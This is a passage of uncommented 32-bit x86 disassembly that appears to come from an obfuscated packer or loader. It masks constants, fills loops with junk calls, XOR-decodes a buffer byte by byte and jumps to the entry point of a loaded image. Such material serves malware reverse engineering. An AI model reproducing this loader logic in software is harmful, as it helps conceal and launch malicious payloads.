  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ff71
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d46c
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d668
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d46c
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d668,eax
  41095e:	mov    eax,ds:0x41d46c
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d46c
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d2f0,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d544,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d2f0
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d46c
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d544
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d2f0
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d46c
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d46c
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d46c
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d4f0,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d4e8,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d46c
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff4d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d2ec
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d4f4
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d46c
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffaf
  410dc5:	push   0x41ff91
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d48c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d3e2
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d288
  411086:	mov    ebx,DWORD PTR ds:0x41d28c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41feee
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
